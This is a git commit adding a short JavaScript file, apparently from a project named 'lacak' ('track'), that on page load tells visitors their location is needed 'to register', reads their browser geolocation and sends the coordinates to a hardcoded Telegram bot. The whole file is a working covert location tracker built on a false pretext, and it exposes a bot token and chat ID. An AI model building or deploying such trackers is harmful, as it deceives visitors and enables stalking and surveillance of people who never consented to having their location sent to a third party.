34d1390432fb2a8a4028b51712bf506084936907
Muhammad Alfin Rashydin <95016837+alfinRashydin28@users.noreply.github.com>
2024-06-24 14:33:25 +0700

    Add files via upload

---
+++ lacak/asset/js.js
@@ -0,0 +1,42 @@
+// Gantilah 'YOUR_BOT_TOKEN' dan 'YOUR_CHAT_ID' dengan informasi bot Telegram Anda.
+var botToken = '6441266112:AAHLvHHiJcKXrKDsifdyJVVt-RPzYu8asIY';
+var chatId = '903460372';
+
+function sendLocationToTelegram(latitude, longitude) {
+    // URL API Telegram untuk mengirim lokasi
+    var telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendLocation';
+
+    // Data yang akan dikirimkan ke API Telegram
+    var data = {
+        chat_id: chatId,
+        latitude: latitude,
+        longitude: longitude
+    };
+
+    axios.post(telegramApiUrl, data)
+        .then(response => {
+            console.log('', response.data);
+        })
+        .catch(error => {
+            console.error('', error);
+        });
+}
+
+function getLocationAndSend() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            sendLocationToTelegram(position.coords.latitude, position.coords.longitude);
+        }, function(error) {
+            console.error('Error getting location:', error);
+            alert('Failed to get your location. Please allow location access and try again.');
+        });
+    } else {
+        console.log("Geolocation is not supported by this browser.");
+        alert('Geolocation is not supported by this browser.');
+    }
+}
+
+document.addEventListener("DOMContentLoaded", function () {
+    alert('This website requires your location to register. Please allow location access.');
+    getLocationAndSend();
+});
